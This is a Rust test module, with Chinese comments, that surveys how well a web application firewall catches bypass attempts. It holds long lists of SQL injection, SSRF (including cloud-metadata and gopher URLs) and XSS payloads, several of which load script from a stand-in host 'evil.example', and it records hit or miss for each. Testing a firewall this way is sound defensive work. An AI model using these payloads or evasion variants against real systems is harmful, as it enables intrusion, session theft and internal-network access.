//! C1/C2/C9 繞過基線量測（不改偵測行為）。
//! 只有設定環境變數 WAF_BYPASS_OUT 時才寫出結果：每行 `hit|miss<TAB>類別<TAB>位置<TAB>樣本`。

#[cfg(test)]
mod bypass_survey {
    use super::super::*;
    use axum::http::{HeaderMap, Method, Uri};
    use std::str::FromStr;

    /// 與其他測試相同：非安全字元先百分比編碼，既有 %XX 保留（讓 %27 之類的樣本維持原意）。
    fn enc(s: &str) -> String {
        let mut out = String::new();
        for b in s.bytes() {
            if b.is_ascii_alphanumeric() || b"/?=&._-%:;,*()+@~".contains(&b) {
                out.push(b as char);
            } else {
                out.push_str(&format!("%{b:02X}"));
            }
        }
        out
    }

    const QUERY_SAMPLES: &[(&str, &str, &str)] = &[
        // SQLi（query）
        ("sqli", "query", "1' or 1=1--"),
        ("sqli", "query", "1'/**/or/**/1=1--"),
        ("sqli", "query", "1' Or 1=1 -- "),
        ("sqli", "query", "1'||'1'='1"),
        ("sqli", "query", "1' and 1=1#"),
        ("sqli", "query", "1 UNION SELECT NULL,NULL--"),
        ("sqli", "query", "1/**/union/**/select/**/1,2"),
        ("sqli", "query", "1 union%0bselect 1,2"),
        ("sqli", "query", "1 union%0aall%0bselect 1,2"),
        ("sqli", "query", "1 union all select 1,2"),
        ("sqli", "query", "1 and extractvalue(1,concat(0x7e,database()))"),
        ("sqli", "query", "1 and updatexml(1,concat(0x7e,version()),1)"),
        ("sqli", "query", "1 and sleep(3)"),
        ("sqli", "query", "1; select pg_sleep(3)--"),
        ("sqli", "query", "1 AND (SELECT COUNT(*) FROM users)>0"),
        ("sqli", "query", "admin'--"),
        ("sqli", "query", "1 OR 'a'='a'"),
        ("sqli", "query", "x' AND SLEEP(5) AND '1'='1"),
        ("sqli", "query", "1/**/and/**/1=1"),
        ("sqli", "query", "-1 union select user()"),
        ("sqli", "query", "1 order by 3--"),
        ("sqli", "query", "1' and '1'='1"),
        ("sqli", "query", "%27%20or%201%3D1--"),
        ("sqli", "query", "%2527%2520or%25201%253D1--"),
        ("sqli", "query", "1 %55NION %53ELECT 1,2"),
        ("sqli", "query", "1 and ascii(substring((select password from users),1,1))>64"),
        ("sqli", "query", "1 || 1=1"),
        ("ssrf", "query", "url=http://localhost/admin"),
        ("ssrf", "query", "url=http://127.1/"),
        ("ssrf", "query", "url=http://0177.0.0.1/"),
        ("ssrf", "query", "url=http://[::1]/"),
        ("ssrf", "query", "url=http://2130706433/"),
        ("ssrf", "query", "url=http://0/"),
        ("ssrf", "query", "url=http://[::ffff:127.0.0.1]/"),
        ("ssrf", "query", "url=http://10.0.0.1/"),
        ("ssrf", "query", "url=http://192.168.1.1:8080/"),
        ("ssrf", "query", "url=gopher://127.0.0.1:6379/_"),
        ("ssrf", "query", "url=http://169.254.169.254/latest/meta-data/"),
        ("ssrf", "query", "url=http://metadata.google.internal/"),
        ("ssrf", "query", "host=10.0.0.1"),
        ("sqli", "query", "1' xor 1=1-- -"),
        ("sqli", "query", "1 /*!50000union*/ /*!50000select*/ 1,2"),
        ("sqli", "query", "1 /*!union*/ select 1,2"),
        ("sqli", "query", "1 union select 1,2 #"),
        ("sqli", "query", "1 UNION%23%0aSELECT 1,2"),
        ("sqli", "query", "1' order by 1#"),
        ("sqli", "query", "1' or 'x' like 'x'-- -"),
        ("sqli", "query", "1 or 2>1"),
        ("sqli", "query", "1 or true--"),
        ("sqli", "query", "1 or not 0"),
        ("sqli", "query", "1/*!12345 or 1=1*/"),
        ("sqli", "query", "1';select pg_sleep(5)--"),
        ("sqli", "query", "1 and (select 1 from(select count(*),concat(0x3a,floor(rand(0)*2))x from information_schema.tables group by x)a)"),
        ("sqli", "query", "1 and 1 in (select 1)"),
        ("sqli", "query", "1 union/*!select*/1,2"),
        // XSS（query）
        ("xss", "query", "<script>alert(1)</script>"),
        ("xss", "query", "<img src=x onerror=alert(1)>"),
        ("xss", "query", "<svg/onload=alert(1)>"),
        ("xss", "query", "<body onload=alert(1)>"),
        ("xss", "query", "<a href=\"javascript:alert(1)\">x</a>"),
        ("xss", "query", "<iframe src=\"javascript:alert(1)\">"),
        ("xss", "query", "<details open ontoggle=alert(1)>"),
        ("xss", "query", "\"><script>alert(1)</script>"),
        ("xss", "query", "<ScRiPt>alert(1)</sCrIpT>"),
        ("xss", "query", "<img src=x onerror=\"&#97;lert(1)\">"),
        ("xss", "query", "<svg><animate onbegin=alert(1) attributeName=x>"),
        ("xss", "query", "<math><mi xlink:href=\"javascript:alert(1)\">"),
        ("xss", "query", "<input autofocus onfocus=alert(1)>"),
        ("xss", "query", "<object data=\"data:text/html;base64,PHNjcmlwdD4=\">"),
        ("xss", "query", "<script src=//evil.example/x.js></script>"),
        ("xss", "query", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        ("xss", "query", "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">"),
        ("xss", "query", "<a onmouseover=alert(1)>x</a>"),
        ("xss", "query", "javascript:alert(document.cookie)"),
        ("xss", "query", "<img/src=x/onerror=alert(1)>"),
        ("xss", "query", "<video><source onerror=\"alert(1)\">"),
        ("xss", "query", "<x onauxclick=alert(1)>"),
        ("xss", "query", "<a href=\"jav&#x09;ascript:alert(1)\">x</a>"),
        ("xss", "query", "<a href=\"java%09script:alert(1)\">x</a>"),
        ("xss", "query", "<a href=\"jav&Tab;ascript:alert(1)\">x</a>"),
        ("xss", "query", "<svg><set attributeName=href to=javascript:alert(1)>"),
        ("xss", "query", "<svg><animate attributeName=href values=javascript:alert(1)>"),
        ("xss", "query", "<math><maction xlink:href=javascript:alert(1)>click"),
        ("xss", "query", "<form><button formaction=javascript:alert(1)>x"),
        ("xss", "query", "<object data=javascript:alert(1)>"),
        ("xss", "query", "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"),
        ("xss", "query", "%u003cscript%u003ealert(1)%u003c/script%u003e"),
        ("xss", "query", "'-alert(1)-'"),
        ("xss", "query", "\" autofocus onfocus=alert(1) x=\""),
        ("xss", "query", "\" autofocus onfocus=import('//evil.example/x.js') x=\""),
        ("xss", "query", "<a href=\"javascript&colon;alert(1)\">x</a>"),
        ("xss", "query", "<x onfocusin=alert(1)>"),
        ("xss", "query", "<input onbeforeinput=alert(1)>"),
        ("xss", "query", "<marquee onstart=alert(1)>"),
        ("xss", "query", "eval(atob('YWxlcnQoMSk='))"),
    ];

    const BODY_SAMPLES: &[(&str, &str, &str, bool)] = &[
        ("xss", "body_json", "{\"q\":\"<img src=x onerror=alert(1)>\"}", false),
        ("xss", "body_json", "{\"q\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}", false),
        ("xss", "body_form", "q=%3Cscript%3E", true),
        ("xss", "body_json", "{\"q\":\"<svg/onload=alert(1)>\"}", false),
        ("xss", "body_json", "{\"q\":\"<details open ontoggle=alert(1)>\"}", false),
        ("sqli", "body_json", "{\"q\":\"1' or 1=1--\"}", false),
        ("sqli", "body_json", "{\"q\":\"1 UNION SELECT 1,2\"}", false),
        ("sqli", "body_json", "{\"q\":\"1/**/union/**/select/**/1,2\"}", false),
        ("sqli", "body_json", "{\"id\":\"1' OR '1'='1\"}", false),
        ("sqli", "body_form", "id=1%27%20OR%20%271%27%3D%271", true),
        ("sqli", "body_json", "{\"q\":\"1 /*!50000UNION*/ SELECT 1,2\"}", false),
        ("sqli", "body_json", "{\"q\":\"1' or 'x' like 'x'-- -\"}", false),
        ("xss", "body_json", "{\"q\":\"<x onauxclick=alert(1)>\"}", false),
        ("xss", "body_json", "{\"q\":\"<marquee onstart=alert(1)>\"}", false),
        ("xss", "body_json", "{\"html\":\"<a href=\\\"jav\\u0009ascript:alert(1)\\\">x</a>\"}", false),
        ("xss", "body_json", "{\"q\":\"\\x3cimg src=x onerror=alert(1)\\x3e\"}", false),
        ("xss", "body_json", "{\"q\":\"[click](javascript:alert(1))\"}", false),
        ("xss", "body_json", "{\"q\":\"<svg><animate attributeName=href values=javascript:alert(1)>\"}", false),
        ("xss", "body_form", "q=%3Cx%20onfocusin%3Dalert(1)%3E", true),
    ];

    #[test]
    fn survey_bypass_baseline() {
        let Ok(out_path) = std::env::var("WAF_BYPASS_OUT") else {
            return;
        };
        let mut lines = Vec::new();
        let mut hits = 0usize;
        let headers = HeaderMap::new();
        for (kind, place, sample) in QUERY_SAMPLES {
            let uri = Uri::from_str(&format!("/x?q={}", enc(sample))).expect("uri");
            let hit = inspect_waf_threat(&uri, &Method::GET, &headers).is_some();
            hits += usize::from(hit);
            lines.push(format!("{}\t{kind}\t{place}\t{sample}", if hit { "hit" } else { "miss" }));
        }
        for (kind, place, body, is_form) in BODY_SAMPLES {
            let hit = inspect_waf_body(body, *is_form).is_some();
            hits += usize::from(hit);
            lines.push(format!("{}\t{kind}\t{place}\t{body}", if hit { "hit" } else { "miss" }));
        }
        let total = QUERY_SAMPLES.len() + BODY_SAMPLES.len();
        lines.push(format!("SUMMARY\thit={hits}\ttotal={total}"));
        std::fs::write(&out_path, lines.join("\n") + "\n").expect("write survey");
    }
}
